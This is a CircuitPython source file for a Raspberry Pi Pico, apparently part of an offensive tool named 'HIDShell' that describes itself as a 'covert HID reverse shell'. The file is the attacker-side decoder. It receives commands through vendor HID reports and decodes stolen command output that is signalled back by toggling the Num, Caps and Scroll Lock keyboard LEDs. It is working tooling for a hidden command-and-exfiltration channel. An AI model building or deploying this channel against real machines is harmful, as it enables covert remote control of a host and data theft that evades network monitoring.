"""
HIDShell - code.py (Pico Decoder / Attacker View)

This runs on the Pico and outputs to Thonny's serial console.
It does two things:
  1. Reads commands arriving via vendor HID OUT reports
  2. Decodes response data from LED state changes

Thonny becomes your attacker terminal showing the full conversation.

Usage:
  1. Run test_harness.py FIRST in PowerShell (it grabs vendor HID)
  2. Then open Thonny (it connects to USB serial separately)
  3. Type commands in test_harness → see decoded output here
"""

import supervisor
import usb_hid
import time
import sys

# ─── Protocol Constants ─────────────────────────────────────────────────────

FRAME_STX = 0x02
FRAME_ETX = 0x03

LED_NUM_LOCK    = 0x01
LED_CAPS_LOCK   = 0x02
LED_SCROLL_LOCK = 0x04

LED_TIMEOUT_S = 3.0

FLAG_START = 0x01
FLAG_END   = 0x02
FLAG_DATA  = 0x04

# ─── ANSI ────────────────────────────────────────────────────────────────────

R   = "\033[0m"
DIM = "\033[2m"
BLD = "\033[1m"
RED = "\033[91m"
GRN = "\033[92m"
YLW = "\033[93m"
CYN = "\033[96m"
GRY = "\033[90m"
WHT = "\033[97m"
MAG = "\033[95m"

# ─── Device Discovery ───────────────────────────────────────────────────────

keyboard_dev = None
command_dev = None

for dev in usb_hid.devices:
    if dev.usage_page == 0x01 and dev.usage == 0x06:
        keyboard_dev = dev
    elif dev.usage_page == 0xFF and dev.usage == 0x01:
        command_dev = dev

# ─── LED Receiver ───────────────────────────────────────────────────────────

class LEDReceiver:
    def __init__(self, kb_device):
        self.kb = kb_device
        self.last_leds = 0
        self.current_byte = 0
        self.bit_count = 0
        self.buffer = bytearray()
        self.in_frame = False
        self.receiving = False
        self.last_change_time = 0.0
        self.bytes_decoded = 0

    def reset(self):
        self.current_byte = 0
        self.bit_count = 0
        self.buffer = bytearray()
        self.in_frame = False
        self.receiving = False
        self.bytes_decoded = 0

    def poll(self):
        if self.kb is None:
            return None
        report = self.kb.last_received_report
        if report is None:
            if self.receiving and (time.monotonic() - self.last_change_time) > LED_TIMEOUT_S:
                if self.buffer:
                    p(GRY, "  timeout - partial: " + str(len(self.buffer)) + " bytes")
                self.reset()
            return None
        current_leds = report[0]
        if current_leds == self.last_leds:
            if self.receiving and (time.monotonic() - self.last_change_time) > LED_TIMEOUT_S:
                if self.buffer:
                    p(GRY, "  timeout - partial: " + str(len(self.buffer)) + " bytes")
                self.reset()
            return None
        changed = current_leds ^ self.last_leds
        self.last_leds = current_leds
        self.last_change_time = time.monotonic()

        if not self.receiving:
            self.receiving = True

        if changed & LED_SCROLL_LOCK:
            if self.bit_count == 8:
                byte_val = self.current_byte
                self.current_byte = 0
                self.bit_count = 0
                if byte_val == FRAME_STX:
                    self.in_frame = True
                    self.buffer = bytearray()
                    self.bytes_decoded = 0
                elif byte_val == FRAME_ETX and self.in_frame:
                    self.in_frame = False
                    self.receiving = False
                    result = bytes(self.buffer)
                    self.buffer = bytearray()
                    total = self.bytes_decoded
                    self.bytes_decoded = 0
                    return result
                elif self.in_frame:
                    self.buffer.append(byte_val)
                    self.bytes_decoded += 1
            else:
                self.current_byte = 0
                self.bit_count = 0
        elif changed & LED_NUM_LOCK:
            self.current_byte = (self.current_byte << 1) | 1
            self.bit_count += 1
        elif changed & LED_CAPS_LOCK:
            self.current_byte = (self.current_byte << 1) | 0
            self.bit_count += 1
        return None

# ─── Command Reader ─────────────────────────────────────────────────────────

class CommandReader:
    """Reads vendor HID OUT reports sent by the test harness."""

    def __init__(self, hid_device):
        self.hid = hid_device
        self.last_report = None

    def poll(self):
        if self.hid is None:
            return None
        report = self.hid.last_received_report
        if report is None:
            return None
        # Only process if it changed (new command)
        if report == self.last_report:
            return None
        self.last_report = bytes(report)
        # Parse report: [flags, length, payload...]
        if len(report) < 2:
            return None
        flags = report[0]
        length = report[1]
        if length == 0:
            return None
        if not (flags & FLAG_DATA):
            return None
        payload = bytes(report[2:2 + length])
        return payload.decode("utf-8", "replace")

# ─── Output Helpers ──────────────────────────────────────────────────────────

def p(color, text):
    sys.stdout.write(color + text + R + "\r\n")

def banner():
    p(RED, "")
    p(RED, "  _   _ ___ ____  ____  _          _ _")
    p(RED, " | | | |_ _|  _ \\/ ___|| |__   ___| | |")
    p(RED, " | |_| || || | | \\___ \\| '_ \\ / _ \\ | |")
    p(RED, " |  _  || || |_| |___) | | | |  __/ | |")
    p(RED, " |_| |_|___|____/|____/|_| |_|\\___|_|_|")
    p(DIM, " covert HID reverse shell // 0dayscyber")
    p(GRY, " " + "-" * 44)
    p(DIM, " PICO DECODER // attacker view via Thonny")
    p(GRY, " " + "-" * 44)

    kb_s = GRN + "OK" + R if keyboard_dev else RED + "MISSING" + R
    hid_s = GRN + "OK" + R if command_dev else RED + "MISSING" + R

    p("", "")
    sys.stdout.write("  " + GRN + "*" + R + " Keyboard (LEDs):  " + kb_s + "\r\n")
    sys.stdout.write("  " + GRN + "*" + R + " Vendor HID (cmds): " + hid_s + "\r\n")
    p("", "")
    p(DIM, " Run test_harness.py first, then open Thonny.")
    p(DIM, " Commands and decoded responses appear below.")
    p(GRY, " " + "-" * 44)
    p("", "")

# ─── Main ────────────────────────────────────────────────────────────────────

banner()

receiver = LEDReceiver(keyboard_dev)
cmd_reader = CommandReader(command_dev)
cmd_count = 0

while True:
    # ── Check for incoming commands via vendor HID ───────────────
    cmd = cmd_reader.poll()
    if cmd:
        cmd_count += 1
        p("", "")
        p(GRY, " " + "-" * 44)
        sys.stdout.write("  " + CYN + ">" + R + " ")
        sys.stdout.write(RED + BLD + "CMD #" + str(cmd_count) + R)
        sys.stdout.write("  " + WHT + cmd + R + "\r\n")
        p(YLW, "  . waiting for LED response...")

    # ── Check for LED response data ──────────────────────────────
    result = receiver.poll()
    if result is not None:
        p("", "")
        p(GRN, "  + RESPONSE (" + str(len(result)) + " bytes)")
        p(GRY, "  +-" + "-" * 42)
        try:
            text = result.decode("utf-8", "replace")
        except Exception:
            text = repr(result)
        for line in text.split("\n"):
            sys.stdout.write("  " + GRY + "| " + R + WHT + line + R + "\r\n")
        p(GRY, "  +-" + "-" * 42)
        p("", "")

    time.sleep(0.001)